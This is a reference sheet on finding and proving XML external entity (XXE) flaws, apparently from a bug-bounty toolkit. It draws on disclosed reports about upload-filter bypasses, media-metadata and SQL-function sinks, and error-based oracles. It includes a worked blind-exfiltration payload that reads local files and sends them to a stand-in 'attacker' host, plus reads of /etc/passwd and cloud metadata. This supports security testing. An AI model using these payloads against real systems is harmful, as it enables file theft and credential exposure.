# XXE — reference layer

> **Lookup, not reading.** Open a section when its trigger fires; don't read this end to end.
> The method lives in `../xxe.md` — that one you read every time.

| § | trigger |
|---|---|
| **X1** | an upload/type filter stands between you and the parser |
| **X2** | you're hunting for where the real XML parser is |
| **X3** | you need to know if output comes back in-band |
| **X4** | blind, and you need an OOB proof-shape |
| **X5** | confirmed — what impact was actually shown vs argued |
| **X6** | a report reads too clean — attribution and thinness traps |
| **X7** | novelty, and hunting fixes |
| **X8** | worked example |

---

## X1. Bypassing the defense — getting XML accepted where it shouldn't be

- **The upload filter and the file-type dispatcher are different programs.** A photo-upload handler
  checked `allow_file_type_list` — a client-supplied parameter. Deleting the parameter, or adding
  `html;` to it, let `.html` and `.xml` files upload as an "avatar." The upload endpoint itself never
  parses XML — a *second*, unrelated endpoint (`hxdynamicpage6.aspx?_hxpage=...` and separately
  `HX_PAGE_NAME` in another servlet) later reads the uploaded file **by filename reference** and feeds
  it to the XML parser [#500515]. The vulnerable code path isn't the one you uploaded through; it's
  whatever consumes the filename afterward. Enumerate every feature that takes a path/filename you
  control as input to a second stage.
- An allowlist implemented as string membership over a client-controlled parameter is trivially
  bypassed by simply removing the restrictive term — no encoding tricks needed [#500515].

## X2. Finding the sink — where the parser actually is

- **Binary media carries XML too.** A JPEG's embedded **XMP metadata block** is XML, parsed by
  whatever downstream Java image/metadata library reads it on avatar upload — the file itself isn't
  `.xml`, isn't validated as XML at upload, and doesn't render as HTML [#836877]. A **WAV audio
  file** carries an XML-bearing chunk that WordPress's media importer parses via
  `simplexml_load_string(..., LIBXML_NOENT)`; the payload had to be hex-edited into the binary at a
  fixed byte offset, not just appended [#1095645]. Any media library that extracts structured
  metadata from an uploaded file is a candidate distinct from the SVG/DOCX surface the method file
  already names.
- **Feed by reference, not by upload.** A "Site Audit" feature takes a **URL** to a `sitemap.xml` and
  fetches + parses it server-side — the attacker never touches the target's upload form at all
  [#312543]. A `?u=` redirect parameter fetched a remote XML document server-side, itself containing
  a parameter entity that pulled a *second* external DTD [#486732]. In both, SOURCE is a URL you
  host, one hop removed from the parser — the same shape as an SSRF renderer sink.
- **Non-HTTP sinks exist.** Apache Hive's `xpath_string()` SQL function parses its first argument as
  XML and evaluates an XPath against it — reached over the Hive Thrift protocol on port 10000, with
  **no HTTP request anywhere in the chain** [#742808]. A legacy vendor spell-check servlet
  (`RapidSpellHelpFile.aspx`) parses a `textToCheck` field carrying a raw XML body [#715949]. A
  legacy SMS-delivery servlet (cloudhopper SXMP) parses an XML `<operation>` body where `operatorId`
  is typed as an integer [#248668]. A PKI certificate-enrollment REST API accepts `application/xml`
  on a `ProfileID` field [#2573567]. Read `technologies.md` for legacy/acquisition SOAP, RPC, and
  database services with an XML-processing function, not just web routes.
- **Matching an error string or servlet name to a public repo tells you which parser you're up
  against before you touch it** — the SXMP behavior matched `github.com/twitter/cloudhopper-commons`
  on GitHub [#248668].

## X3. Getting output back — in-band oracles actually observed

- **Type-coercion error echo.** A field typed as an integer (`operatorId`) failed to parse the
  expanded entity, and the parser's own error message echoed the *entire* expanded value —
  `/etc/passwd` came back inside `"Unable to convert [root:x:0:0:...] to an integer"` [#248668]. Any
  field with a non-string expected type is a free oracle: force the type check to fail and read its
  error text.
- **Direct reflection.** A spell-check field returns the text it "checked" verbatim in the response —
  pointing the entity at a local file put its content straight into the HTTP response, no OOB channel
  needed [#715949].
- **The sink's own return value is the oracle.** Hive's `xpath_string()` *is* the function whose job
  is to hand back evaluated XML content — the metadata it read came straight back over the same SQL
  connection [#742808]. When the sink is a function whose purpose is returning parsed content, check
  its own return path before reaching for a collaborator.

## X4. Blind — the OOB proof-shapes actually used

- **Two-stage DTD-combine for local file exfil**, the corpus's clearest blind mechanism: a parameter
  entity referencing a local `file://` can't be combined with a general entity in the same *internal*
  DTD subset (a well-formedness constraint), so the payload declares one parameter entity for the
  local file plus a second pointing at an attacker-hosted **external DTD** that does the combining
  (`<!ENTITY xxe "%goodies;">`), and the result is exfiltrated as the **path segment** of the outbound
  request the parser then makes, landing in the attacker's own HTTP access log [#312543]. Reach for
  this whenever a sink won't accept a local file and a remote `SYSTEM` id in the same declaration.
- **A distinguishing client signature on the callback identifies which component resolved it** — a
  `Java/…`-family User-Agent confirms the JVM's own XML stack fetched the external DTD, not a
  fronting proxy [#836877].
- **A working blind bypass doesn't have to repeat the original payload.** The DuckDuckGo bypass of a
  prior fix used a URL-fetched XML document whose parameter entity pulled a second, attacker-hosted
  external DTD — structurally different from whatever the original fix addressed [#486732, explicitly
  filed as a bypass of #483774].

## X5. Confirmed-impact escalation

- **XXE-SSRF into cloud metadata, in-band, no collaborator needed.** The Hive sink was pointed at
  `metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys` and `.../project-id`,
  and the metadata came back directly in the SQL result [#742808]. Impact argued (GCP Storage /
  BigQuery / BigTable reachability via the project's service credentials) stops at metadata read — the
  report doesn't show a fetched token.
- **Local file read confirmed; the NTLM angle is not.** `file:///c:\Windows\System32\Drivers\etc\hosts`
  came back directly in the response; a claim of UNC-path NTLM hash theft and arbitrary internal
  request/response reading leans entirely on an external blog link, not a report artifact [#715949,
  asserted in a writeup with no artifact].
- **Escalation chain argued, not executed.** WordPress's report reasons from the vulnerable flag to
  DoS, SSRF, and `phar://`-deserialization RCE, but the submitted PoC only shows `/etc/passwd` — the
  rest is accepted prose, not a working artifact [#1095645, asserted].
- **Impact narrative exceeding the confirmed artifact.** Starbucks's *confirmed* proof is the DTD
  server's own access-log hit (OOB resolution); credential theft, stored XSS via the separately
  uploaded `.html` file, and NTLMv2 capture are impact argument, not shown chained through the XXE
  itself [#500515].

## X6. Attribution traps and thin reports — read the artifact, not the title

- **A title claiming RCE with a body showing only DOCTYPE acceptance.** "XXE ... that may lead to
  RCE" — the PoC is a bare `<!DOCTYPE a PUBLIC "-//B/A/EN" "HELLO_XXE">`, no callback, no file read,
  no confirmation of resolution shown at all [#227880, asserted in a writeup with no artifact]. Still
  accepted at critical on a no-bounty DoD program — program acceptance is not proof of depth.
- **Boilerplate write-ups carry the least evidence.** A PKI cert-enrollment report reads as generic
  CWE-611 template text ("...in rare cases, execute remote code") with the PoC pasted twice and no
  response shown proving the file content actually returned [#2573567] — the entity declaration is
  correct against a real endpoint, but the *result* is unverified from the writeup alone.
- **No-bounty VDP reports are still legitimate technique sources.** Half the usable reports here paid
  nothing (four DoD, one Evernote non-production asset) and are still concrete and reproducible —
  don't discount a technique for being unpaid.

## X7. Novelty and hunting fixes

- **Two different parsers can sit behind one filename extension** — the endpoint that accepts an
  upload is not always the endpoint that later parses it [#500515]. Enumerate every place a filename
  or URL you control is handed to a second consumer.
- **Re-test a patched report with a structurally different delivery mechanism**, not the original
  payload — moving the entity into a parameter-entity-driven external DTD, fetched via a different
  parameter, bypassed a prior fix [#486732].
- **Binary/media formats are underexplored relative to SVG/DOCX.** JPEG XMP [#836877] and WAV
  metadata chunks [#1095645] both carried working payloads; any media library extracting structured
  metadata from an upload is a candidate.
- **A parser flag can silently re-enable resolution across a runtime-version migration.** WordPress
  correctly disabled the old entity loader for PHP <8, then relied on libxml's new safe default for
  PHP 8 — except it also passed `LIBXML_NOENT`, which explicitly re-enables entity substitution
  regardless of that default [#1095645]. When a stack's major runtime version changes, re-check every
  parser call for flags that assumed the old default.
- **Non-HTTP protocols are undertested** — a SQL function and a Thrift-based database service both
  parsed XML with no web request in the chain [#742808]. Where `technologies.md` names a database,
  queue, or RPC service with an XML-processing function in its query language, treat it as a
  candidate sink.

## X8. Worked example — the DTD-combine blind file read

*Model:* SOURCE = a `sitemap.xml` URL the attacker hosts and the target fetches; FEED = the site-audit
crawler's Java XML processor; SINK = the parser's filesystem and outbound-HTTP access. *Context:* no
value reflects in the response — blind. *Hypothesis:* the parser resolves external entities, but a
general entity can't combine a parameter entity referencing a local file within the same internal
subset. *Confirm:* declare `<!ENTITY % goodies SYSTEM "file:///etc/hostname">` plus
`<!ENTITY % dtd SYSTEM "http://attacker/combine.dtd">` then `%dtd;` — the external DTD itself declares
`<!ENTITY xxe "%goodies;">`, and referencing `&xxe;` inside a `<loc>` element makes the crawler request
`http://attacker/resp/<hostname-content>`, landing the file's content in the attacker's own access log
as a path segment [#312543]. *Validate:* one hostname read is enough to prove the primitive; a
directory listing of `/home` in the same report is already past the "minimum needed" bar the method
file sets — cite it as evidence of ceiling, not as something to reproduce on a live target.
*fix_locus =* "sitemap.xml XML parser in the Site Audit crawler, external-entity resolution enabled."

---

## Grounded in disclosed reports

*Corpus: `knowledge/reports/xxe/`. The upstream index lists 40 XXE-tagged reports; 17 were fetched to
disk. Of those 17, 7 are not XXE at all — they're RCE-family reports (deserialization, file-read
chains, unrelated CTF writeups) swept in by the same upstream fetch and excluded here
(`154096, 415501, 105434, 55431, 105753, 106797, 106865`). That leaves **10 usable XXE reports**, all
cited above with real technique detail — no thin stubs among them, though two are notably thin on
*evidence* even while the payload itself is real (`#227880`, `#2573567`, both flagged inline).
**Corpus bias:** four of the ten are U.S. DoD VDP submissions (no bounty, so write-ups skew short and
PoC-only) and two are Informatica's public program; genuinely distinct sinks are rare — one SQL
function (`#742808`), one binary-media format each for JPEG and WAV (`#836877`, `#1095645`), and one
fix-bypass pair (`#486732` vs `#483774`, the latter not itself in this corpus). No SAML, DOCX/XLSX, or
SVG example survived the 10 — those are covered generically in the method file and by a disclosed
SVG/XInclude XXE bypass already cited in `ref/ssrf.md` [#347139], not duplicated here. Thin on classic
public-API "just POST XML and get a callback" cases; most of what's here required finding a
non-obvious feed (file reference, media metadata, SQL function) rather than an obvious XML endpoint.*
